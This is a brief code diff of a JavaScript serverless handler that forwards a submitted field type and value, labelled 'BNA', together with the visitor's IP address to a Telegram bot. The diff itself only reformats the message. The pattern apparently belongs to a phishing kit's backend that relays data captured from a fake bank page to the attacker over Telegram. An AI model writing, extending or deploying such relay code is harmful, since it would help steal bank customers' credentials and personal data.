@@ -10,11 +10,11 @@ exports.handler = async (event) => {
   const mensaje = `
 📩 BNA
 
-`${tipo}: ${valor}`
-
+${tipo}
+${valor}
 IP: ${ip}
   `;
-
+  
   await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -29,6 +29,7 @@ IP: ${ip}
     body: JSON.stringify({ ok: true })
   };
 };
+
 
 
 
